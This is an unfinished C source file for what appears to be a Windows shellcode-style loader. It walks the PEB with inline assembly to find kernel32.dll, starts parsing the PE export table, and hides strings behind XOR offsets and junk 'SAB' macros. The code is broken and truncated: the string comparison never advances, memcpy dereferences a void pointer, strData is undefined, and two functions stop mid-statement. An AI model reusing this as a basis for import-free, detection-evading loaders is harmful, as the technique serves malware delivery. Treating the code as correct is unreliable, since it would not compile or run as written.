#include <stdio.h>
#include "libob.c"

#ifndef NULL
#define NULL ((void *) 0)
#endif

void *getKern() {
    void *ptr;
    SAB;
    SAB;
    // Get peb
#ifdef _LP64
    __asm__("movq %%fs:0x60, %0":"=r"(ptr));
#else
    __asm__("movl %%fs:0x30, %0":"=r"(ptr));
#endif
    // Get peb_ltr_data
    ptr = ((char *) ptr) + (4 + 2 * sizeof(void *));
    ptr = *((void **) ptr);
    // Get InMemoryOrderModuleList
    ptr = ((char *) ptr) + (8 + 3 * sizeof(void *));
    ptr = *((void **) ptr);
    // Get third item (kernal32.dll) base address
    SAB;
    SAB;
    return ***((char ****) ptr) + (4 * sizeof(void *));
}

static char strLookup[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz.";

char _access(unsigned int offset) {
    SAB;
    offset ^= 0xfeedfeed;
    return strData[offset - 17];
}

#define access(x) _access(((x) + 17) ^ 0xfeedfeed)

void memcpy(const restrict char *src, restrict void *dst, unsigned int len) {
    for (unsigned int i = 0; i < len; i++) {
        dst[i] = src[i];
    }
}

int streq(const char *a, const char *b) {
    unsigned int i = 0;
    while (1) {
        char r = a[i];
        if (r != b[i]) return 0;
        if (!r) return 1;
    }
}

void *getExportTable(void *dll) {
    // Get start of new exe header
    char *ptr = dll + 60;
    ptr = dll + *((long *) ptr);
    // Find the number of rva entries
    ptr += 116;
    unsigned long relCnt = *((unsigned long *) ptr);
    if (!relCnt) return NULL;
    // Get export table rva
    ptr += 4;
    unsigned long exportRva = *((unsigned long *) ptr);
    // Find the section the export table is located in
    ptr += relCnt * 8;
    

__attribute__((section(".text.startup"))) void _start() {
    void *kern = getKern();
    void *expTable = get
}
